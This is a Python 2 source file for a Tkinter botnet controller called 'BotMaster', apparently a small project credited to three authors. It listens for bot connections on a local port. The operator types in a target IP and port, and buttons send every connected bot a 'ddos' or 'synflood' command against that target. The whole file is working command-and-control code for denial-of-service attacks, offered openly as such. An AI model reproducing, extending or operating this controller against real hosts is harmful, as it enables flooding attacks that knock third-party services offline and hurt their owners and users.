from socket import *
import subprocess, os, sys, time, threading
from Tkinter import *
from PIL import ImageTk, Image
from ttk import *
import tkMessageBox

allConnections = []
allAddresses = []

port = 3333
host = "127.0.0.1"
victimIp = NONE #target ip
victimPort = NONE #target port

#MAIN GUI

#Close connections
def quitClients():
	for item in allConnections:
		try:
			item.send("exit")
			item.close()
		except: #Connection already closed
			pass

	del allConnections[:]
	del allAddresses[:]	

#Get bot connections
def getConnections():
	quitClients()
	while 1:
		if not allConnections:
			try:
				q,addr=botnet.accept() #Lasts 5 seconds and then Exception
				q.setblocking(1) #Every new socket has no timeout
				allConnections.append(q)
				allAddresses.append(addr)
			except:
				break
		else:
			break  
			
def DDOS():
	victimIp = E2.get()
	victimPort= E3.get()
	for item in allConnections:
		try:
			item.send(victimIp)
			item.send(b" ")
			item.send(victimPort)
			item.send(b" ddos")
		except:
			pass
			
def syn_Flood():
	victimIp = E2.get()
	victimPort = E3.get()
	for item in allConnections:
		try:
			item.send(victimIp)
			item.send(b" ")
			item.send(victimPort)
			item.send(b" synflood")
		except:
			pass

def help():
	tkMessageBox.showinfo("Directions", "Click Accept bots to accept connections and click an attack!")

def about():
	tkMessageBox.showinfo("About", "Created by Antonis Manaras, Christos Tsogidis, Vasilis Kouliaridis")
				
#Creates the window
root = Tk()

#Modify root window
root.resizable(width=False, height=False)
root.title("BotMaster")
root.geometry("700x260")


#Setting the logo
img = ImageTk.PhotoImage(Image.open("static/img/logo.jpg"))

#Displaying the logo
panel = Label(root, image = img)
panel.grid(row=9,column=0,columnspan=6,rowspan=6,sticky="s")

#Separator line
Separator(root,orient=HORIZONTAL).grid(row=3,columnspan=7,sticky="nsew")#first separator between textbox and label
Separator(root,orient=HORIZONTAL).grid(row=6,columnspan=7,sticky="nsew")#second separator between textbox and label

#Making the label
optionlabel = Label(text="Botnet Options")
optionlabel.grid(row=4,column=1)
optionlabel2 = Label(text="Botnet Attacks")
optionlabel2.grid(row=7,column=1)

#Constructing the first button
button_1 = Button(root, text="Remove Bots", command=quitClients)
button_1.grid(row=5,column=0)

#Constructing the second button
button_2 = Button(root, text="Accept Bots", command=getConnections)                  
button_2.grid(row=5,column=1)

#Botnet Actions
#Constructing the botnetbuttons
button_3 = Button(root, text="DDOS", command=DDOS)    
button_3.grid(row=8,column=0)
button_4 = Button(root, text="SYN FLOOD", command=syn_Flood)       
button_4.grid(row=8,column=1)

menubar = Menu(root)
windowmenu = Menu(menubar, tearoff=0)
windowmenu.add_command(label="Exit", command=root.quit)
menubar.add_cascade(label="Window", menu=windowmenu)

helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_command(label="Help", command=help)
helpmenu.add_command(label="About...", command=about)
menubar.add_cascade(label="Help", menu=helpmenu)

#Constructing the Header Label
L2 = Label(root, text="Insert Target's IP:")#this is the target ip label
L2.grid(row=1,column=0,sticky="nsew")
E2 = Entry(root)
E2.grid(row=1,column=1,sticky="nsew") 

L3 = Label(root, text="Insert Target's Port:")#this is the target port label
L3.grid(row=2,column=0,sticky="nsew")
E3 = Entry(root)
E3.grid(row=2,column=1,sticky="nsew") 
          
#Program Starts here:
botnet = socket(AF_INET, SOCK_STREAM)
botnet.bind((host,port))
botnet.listen(5)

#Kick off the event loop
root.config(menu=menubar)
root.mainloop() #Keeps the window open
